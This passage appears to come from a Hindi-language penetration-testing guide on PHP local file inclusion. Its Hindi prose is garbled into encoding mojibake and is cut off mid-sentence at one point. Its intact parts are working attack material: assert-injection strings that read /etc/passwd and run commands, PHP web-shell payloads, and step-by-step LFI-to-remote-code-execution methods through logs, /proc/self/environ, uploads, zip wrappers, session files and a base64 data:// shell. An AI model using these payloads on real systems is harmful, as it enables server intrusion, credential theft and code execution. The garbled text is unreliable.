* [php://memory рдФрд░ php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) тАФ рдореЗрдореЛрд░реА рдореЗрдВ рд▓рд┐рдЦреЗрдВ рдпрд╛ рдПрдХ рдЕрд╕реНрдерд╛рдпреА рдлрд╝рд╛рдЗрд▓ рдореЗрдВ (рдпрд╣ рдХреИрд╕реЗ рдПрдХ рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢рди рд╣рдорд▓реЗ рдореЗрдВ рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╕реНрдкрд╖реНрдЯ рдирд╣реАрдВ рд╣реИ)
* [file://](https://www.php.net/manual/en/wrappers.file.php) тАФ рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рдкреНрд░рдгрд╛рд▓реА рддрдХ рдкрд╣реБрдБрдЪрдирд╛
* [http://](https://www.php.net/manual/en/wrappers.http.php) тАФ HTTP(s) URLs рддрдХ рдкрд╣реБрдБрдЪрдирд╛
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) тАФ FTP(s) URLs рддрдХ рдкрд╣реБрдБрдЪрдирд╛
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) тАФ рд╕рдВрдкреАрдбрд╝рди рд╕реНрдЯреНрд░реАрдореНрд╕
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) тАФ рдкреИрдЯрд░реНрди рдХреЗ рд╕рд╛рде рдореЗрд▓ рдЦрд╛рддреА рдкрдердирд╛рдореЗрдВ рдЦреЛрдЬреЗрдВ (рдпрд╣ рдХреБрдЫ рдкреНрд░рд┐рдВрдЯ рдХрд░рдиреЗ рдпреЛрдЧреНрдп рдирд╣реАрдВ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣рд╛рдБ рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдЙрдкрдпреЛрдЧреА рдирд╣реАрдВ рд╣реИ)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) тАФ рд╕реБрд░рдХреНрд╖рд┐рдд рд╢реИрд▓реА 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) тАФ рдСрдбрд┐рдпреЛ рд╕реНрдЯреНрд░реАрдореНрд╕ (рд╡рд┐рдЪрд╛рд░реНрдп рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЛ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рдирд╣реАрдВ рд╣реИ)

## PHP рдХреЗ 'assert' рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ LFI

PHP рдореЗрдВ рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢рди (LFI) рдЬреЛрдЦрд┐рдо рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ 'assert' рдлрд╝рдВрдХреНрд╢рди рдХреЗ рд╕рд╛рде рд╣реЛрддреЗ рд╣реИрдВ, рдЬреЛ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ рднреАрддрд░ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рд╕рдорд╕реНрдпрд╛рддреНрдордХ рд╣реИ рдЕрдЧрд░ рдЗрдирдкреБрдЯ рдореЗрдВ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдЯреНрд░рд╛рд╡рд░реНрд╕рд▓ рд╡рд╛рд▓реЗ рд╡рд░реНрдг рдЬреИрд╕реЗ ".." рд╢рд╛рдорд┐рд▓ рд╣реЛ рдФрд░ рдЙрдиреНрд╣реЗрдВ рдареАрдХ рд╕реЗ рд╕реИрдирд┐рдЯрд╛рдЗрдЬрд╝ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, PHP рдХреЛрдб рдореЗрдВ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдЯреНрд░рд╛рд╡рд░реНрд╕рд▓ рдХреЛ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд░реВрдк рд╕реЗ рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```bash
assert("strpos('$file', '..') === false") or die("");
```
рдЬрдм рдпрд╣ рдЯреНрд░рд╛рд╡рд░реНрд╕рд▓ рдХреЛ рд░реЛрдХрдиреЗ рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рд░рдЦрддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдЕрдирдЬрд╛рдиреЗ рдореЗрдВ рдХреЛрдб рдЗрдиреНрдЬреЗрдХреНрд╢рди рдХреЗ рд▓рд┐рдП рдПрдХ рд╡реЗрдХреНрдЯрд░ рдмрдирд╛ рджреЗрддрд╛ рд╣реИред рдлрд╝рд╛рдЗрд▓ рд╕рд╛рдордЧреНрд░реА рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣рдорд▓рд╛рд╡рд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
рдЙрд╕реА рддрд░рд╣, рдЕрдиреНрдп рд╕рд┐рд╕реНрдЯрдо рдХрдорд╛рдВрдб рдХреЛ рдирд┐рд╖реЗрдзрд╛рдЬреНрдЮрд╛ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП рдХреЛрдИ рднреА рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```plaintext
' and die(system("id")) or '
```
рдпреЗ payloads **URL-encode рдХрд░рдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ**ред


<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) рд╕рд░реНрд╡рд░ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдХрд░ рдЕрдиреБрднрд╡реА рд╣реИрдХрд░реНрд╕ рдФрд░ рдмрдЧ рдмрд╛рдЙрдВрдЯреА рд╣рдВрдЯрд░реНрд╕ рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЬреБрдбрд╝реЗрдВ!

**рд╣реИрдХрд┐рдВрдЧ рдЗрдВрд╕рд╛рдЗрдЯреНрд╕**\
рд╣реИрдХрд┐рдВрдЧ рдХреЗ рд░реЛрдорд╛рдВрдЪ рдФрд░ рдЪреБрдиреМрддрд┐рдпреЛрдВ рдореЗрдВ рдбреВрдмрдиреЗ рд╡рд╛рд▓реА рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде рдЬреБрдбрд╝реЗрдВ

**рд░рд┐рдпрд▓-рдЯрд╛рдЗрдо рд╣реИрдХ рдиреНрдпреВрдЬрд╝**\
рд░рд┐рдпрд▓-рдЯрд╛рдЗрдо рдиреНрдпреВрдЬрд╝ рдФрд░ рдЗрдВрд╕рд╛рдЗрдЯреНрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣реИрдХрд┐рдВрдЧ рд╡рд┐рд╢реНрд╡ рдХреЗ рддреЗрдЬреА рд╕реЗ рдмрджрд▓рддреЗ рдорд╛рд╣реМрд▓ рдореЗрдВ рдЕрдкрдб
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
### рдИрдореЗрд▓ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

**рдПрдХ рдореЗрд▓** рднреЗрдЬреЗрдВ рдПрдХ рдЖрдВрддрд░рд┐рдХ рдЦрд╛рддреЗ (user@localhost) рдХреЛ рдЬрд┐рд╕рдореЗрдВ рдЖрдкрдХрд╛ PHP рдкреЗрд▓реЛрдб рд╢рд╛рдорд┐рд▓ рд╣реИ рдЬреИрд╕реЗ `<?php echo system($_REQUEST["cmd"]); ?>` рдФрд░ рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдВ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдореЗрд▓ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рдХрд░реЗрдВ рдПрдХ рдкрде рдХреЗ рд╕рд╛рде рдЬреИрд╕реЗ **`/var/mail/<USERNAME>`** рдпрд╛ **`/var/spool/mail/<USERNAME>`**

### /proc/\*/fd/\* рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

1. рдмрд╣реБрдд рд╕рд╛рд░реЗ рд╢реИрд▓ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП: 100)
2. рд╢рд╛рдорд┐рд▓ рдХрд░реЗрдВ [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), $PID = рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХрд╛ PID (рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ) рдФрд░ $FD рдлрд╝рд╛рдЗрд▓ рдбрд┐рд╕реНрдХреНрд░рд┐рдкреНрдЯрд░ рд╣реИ (рдпрд╣ рднреА рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ)

### /proc/self/environ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдПрдХ рд▓реЙрдЧ рдлрд╝рд╛рдЗрд▓ рдХреА рддрд░рд╣, рдпреВрдЬрд╝рд░-рдПрдЬреЗрдВрдЯ рдореЗрдВ рдкреЗрд▓реЛрдб рднреЗрдЬреЗрдВ, рдпрд╣ /proc/self/environ рдлрд╝рд╛рдЗрд▓ рдХреЗ рдЕрдВрджрд░ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рд╣реЛрдЧрд╛
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### рдЕрдкрд▓реЛрдб рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдпрджрд┐ рдЖрдк рдПрдХ рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЙрд╕рдореЗрдВ рд╢реИрд▓ рдкреЗрд▓реЛрдб рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░реЗрдВ (рдЬреИрд╕реЗ: `<?php system($_GET['c']); ?>`).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
### рдЬрд╝рд┐рдк рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдПрдХ рдЬрд╝рд┐рдк рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХрд░реЗрдВ рдЬрд┐рд╕рдореЗрдВ рдПрдХ PHP рд╢реИрд▓ рд╕рдВрдХреБрдЪрд┐рдд рд╣реЛ рдФрд░ рдкрд╣реБрдВрдЪреЗрдВ:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### PHP рд╕рддреНрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рд╡реЗрдмрд╕рд╛рдЗрдЯ PHP рд╕рддреНрд░ (PHPSESSID) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреА рд╣реИрдВ
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
PHP рдореЗрдВ рдпреЗ рд╕реЗрд╢рди _/var/lib/php5/sess\\_\[PHPSESSID]\_ рдлрд╝рд╛рдЗрд▓реЛрдВ рдореЗрдВ рд╕реНрдЯреЛрд░ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВред
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
рдпрд╣рд╛рдБ рдХреБрдХреА рдХреЛ `<?php system('cat /etc/passwd');?>` рд╕реЗрдЯ рдХрд░реЗрдВред
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
рдПрд▓рдПрдлрдЖрдИ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рддрд╛рдХрд┐ PHP рд╕рддреНрд░ рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рдорд╛рд╣рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### рдПрд╕рдПрд╕рдПрдЪ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдпрджрд┐ рдПрд╕рдПрд╕рдПрдЪ рд╕рдХреНрд░рд┐рдп рд╣реИ, рддреЛ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреМрди рд╕рд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ (/proc/self/status & /etc/passwd) рдФрд░ **\<HOME>/.ssh/id\_rsa** рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВред

### **рд╡рд╛рдпрд╛** **vsftpd** _**рд▓реЙрдЧ**_

FTP рд╕рд░реНрд╡рд░ vsftpd рдХреЗ рд▓реЙрдЧ **_/var/log/vsftpd.log_** рдкрд░ рд╕реНрдерд┐рдд рд╣реИрдВред рдЬрдм рдПрдХ рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢рди (LFI) рджреБрд░реБрдкрдпреЛрдЧ рд╕рдВрднрд╛рд╡рдирд╛ рд╣реЛрддреА рд╣реИ, рдФрд░ рдПрдХ рдЙрдЬрд╛рдЧрд░ vsftpd рд╕рд░реНрд╡рд░ рддрдХ рдкрд╣реБрдВрдЪ рд╕рдВрднрд╡ рд╣реЛрддреА рд╣реИ, рддреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХрджрдо рд╡рд┐рдЪрд╛рд░рд┐рдд рдХрд┐рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

1. рд▓реЙрдЧрд┐рди рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рджреМрд░рд╛рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдлрд╝реАрд▓реНрдб рдореЗрдВ рдПрдХ PHP рдкреЗрд▓реЛрдб рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░реЗрдВред
2. рдЗрдВрдЬреЗрдХреНрд╢рди рдХреЗ рдмрд╛рдж, LFI рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **_/var/log/vsftpd.log_** рд╕реЗ рд╕рд░реНрд╡рд░ рд▓реЙрдЧреНрд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВред

### рдлрд╝рд┐рд▓реНрдЯрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ php base64 (base64 рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ)

[рдЗрд╕](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) рд▓реЗрдЦ рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ PHP base64 рдлрд╝рд┐рд▓реНрдЯрд░ рдХреЗрд╡рд▓ Non-base64 рдХреЛ рдирдЬрд░рдЕрдВрджрд╛рдЬ рдХрд░рддрд╛ рд╣реИред рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдлрд╝рд╛рдЗрд▓ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреА рдЬрд╛рдВрдЪ рдХреЛ рдЫрд▓рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: рдпрджрд┐ рдЖрдк рдЙрд╕ рдмреЗрд╕64 рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ ".php" рд╕реЗ рд╕рдорд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдмрд╕ "." рдХреЛ рдирдЬрд░рдЕрдВрджрд╛рдЬ рдХрд░реЗрдЧрд╛ рдФрд░ "php" рдХреЛ рдмреЗрд╕64 рдореЗрдВ рдЬреЛрдбрд╝ рджреЗрдЧрд╛ред рдпрд╣рд╛рдБ рдПрдХ рдЙрджрд╛рд╣рд░рдг рдкреЗрд▓реЛрдб рд╣реИ:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### рдлрд╛рдЗрд▓ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ php рдлрд╝рд┐рд▓реНрдЯрд░реНрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ (рдХреЛрдИ рдлрд╝рд╛рдЗрд▓ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ)

рдпрд╣ [**рд▓реЗрдЦ**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) рд╕реНрдкрд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдЖрдк **php рдлрд╝рд┐рд▓реНрдЯрд░реНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╡рд┐рдЪрд┐рддреНрд░ рд╕рд╛рдордЧреНрд░реА** рдХреЛ рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЖрдк **рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ** рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рдЪрд┐рддреНрд░ php рдХреЛрдб рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### рд╕реЗрдЧрдореЗрдВрдЯреЗрд╢рди рдлреЙрд▓реНрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

**рдПрдХ рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб** рдХрд░реЗрдВ рдЬреЛ `/tmp` рдореЗрдВ **рдЕрд╕реНрдерд╛рдпреА рд░реВрдк рд╕реЗ** рд╕рдВрдЧреНрд░рд╣реАрдд рдХреА рдЬрд╛рдПрдЧреА, рдлрд┐рд░ **рдЙрд╕реА рдЕрдиреБрд░реЛрдз рдореЗрдВ,** рдПрдХ **рд╕реЗрдЧрдореЗрдВрдЯреЗрд╢рди рдлреЙрд▓реНрдЯ** рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВ, рдФрд░ рдлрд┐рд░ **рдЕрд╕реНрдерд╛рдпреА рдлрд╝рд╛рдЗрд▓ рдорд┐рдЯрд╛рдИ рдирд╣реАрдВ рдЬрд╛рдПрдЧреА** рдФрд░ рдЖрдк рдЙрд╕реЗ рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВред

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Nginx рдЕрд╕реНрдерд╛рдпреА рдлрд╝рд╛рдЗрд▓ рд╕рдВрдЧреНрд░рд╣рдг рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдпрджрд┐ рдЖрдкрдиреЗ **рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢рди** рдкрд╛рдпрд╛ рд╣реИ рдФрд░ **Nginx** PHP рдХреЗ рд╕рд╛рдордиреЗ рдЪрд▓ рд░рд╣рд╛ рд╣реИ рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрдХрдиреАрдХ рдХреЗ рд╕рд╛рде RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### PHP\_SESSION\_UPLOAD\_PROGRESS рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдпрджрд┐ рдЖрдкрдиреЗ **рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢рди** рдкрд╛рдпрд╛ рд╣реИ рднрд▓реЗ рд╣реА рдЖрдкрдХреЗ рдкрд╛рд╕ **рдХреЛрдИ рд╕рддреНрд░ рди рд╣реЛ** рдФрд░ `session.auto_start` `Off` рд╣реИред рдпрджрд┐ рдЖрдк **рдорд▓реНрдЯреАрдкрд╛рд░реНрдЯ POST** рдбреЗрдЯрд╛ рдореЗрдВ **`PHP_SESSION_UPLOAD_PROGRESS`** рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВ, рддреЛ PHP **рдЖрдкрдХреЗ рд▓рд┐рдП рд╕рддреНрд░ рд╕рдХреНрд╖рдо рдХрд░ рджреЗрдЧрд╛**ред рдЖрдк рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Windows рдореЗрдВ рдЕрд╕реНрдерд╛рдпреА рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдпрджрд┐ рдЖрдкрдиреЗ **рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢рди** рдкрд╛рдпрд╛ рд╣реИ рдФрд░ рд╕рд░реНрд╡рд░ **Windows** рдореЗрдВ рдЪрд▓ рд░рд╣рд╛ рд╣реИ рддреЛ рдЖрдк RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### phpinfo() (file\_uploads = on) рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдпрджрд┐ рдЖрдкрдиреЗ **рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢рди** рдкрд╛рдпрд╛ рд╣реИ рдФрд░ рдПрдХ рдлрд╝рд╛рдЗрд▓ **phpinfo()** рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░ рд░рд╣реА рд╣реИ рдЬрд┐рд╕рдореЗрдВ file\_uploads = on рд╣реИ, рддреЛ рдЖрдк RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### compress.zlib + `PHP_STREAM_PREFER_STUDIO` + рдкрде рднреЗрдж

рдпрджрд┐ рдЖрдкрдиреЗ **рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢рди** рдкрд╛рдпрд╛ рд╣реИ рдФрд░ рдЖрдк **рдЕрд╕реНрдерд╛рдпреА рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдкрде рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ** рд▓реЗрдХрд┐рди **рд╕рд░реНрд╡рд░** рдпрд╣ **рдЬрд╛рдВрдЪ рд░рд╣рд╛ рд╣реИ** рдХрд┐ **рд╕рдорд╛рд╡реЗрд╢ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдлрд╝рд╛рдЗрд▓ рдореЗрдВ PHP рдорд╛рд░реНрдХреНрд╕ рд╣реИрдВ** рддреЛ рдЖрдк рдЗрд╕ **рд░реЗрд╕ рдХрдВрдбреАрд╢рди** рдХреЗ рд╕рд╛рде рдЙрд╕ рдЬрд╛рдВрдЪ рдХреЛ **рдЫрд▓рдирд╛** рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### рдЕрдирдВрдд рдкреНрд░рддреАрдХреНрд╖рд╛ + рдмреНрд░реВрдЯрдлрд╝реЛрд░реНрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдпрджрд┐ рдЖрдк LFI рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдЕрд╕реНрдерд╛рдпреА рдлрд╝рд╛рдЗрд▓реЗрдВ рдЕрдкрд▓реЛрдб** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╕рд░реНрд╡рд░ рдХреЛ **PHP рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рдореЗрдВ рдлрдВрд╕рд╛** рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдлрд┐рд░ **рдШрдВрдЯреЛрдВ рддрдХ рдЕрд╕реНрдерд╛рдпреА рдлрд╝рд╛рдЗрд▓реЗрдВ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдлрд╝рд╛рдЗрд▓реЛрдВ рдХрд╛ рдмреНрд░реВрдЯрдлрд╝реЛрд░реНрд╕** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### рдлреЗрдЯрд▓ рддреНрд░реБрдЯрд┐ рдХреЗ рд▓рд┐рдП

рдпрджрд┐ рдЖрдк `/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar` рдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╢рд╛рдорд┐рд▓ рдХрд░рддреЗ рд╣реИрдВред (рдЖрдкрдХреЛ рдЙрд╕реА рдХреЛ 2 рдмрд╛рд░ рд╢рд╛рдорд┐рд▓ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рддрд╛рдХрд┐ рд╡рд╣ рддреНрд░реБрдЯрд┐ рдлреЗрдВрдХреЗред)

**рдореБрдЭреЗ рдирд╣реАрдВ рдкрддрд╛ рдХрд┐ рдпрд╣ рдХрд┐рддрдирд╛ рдЙрдкрдпреЛрдЧреА рд╣реИ рд▓реЗрдХрд┐рди рдпрд╣ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред**\
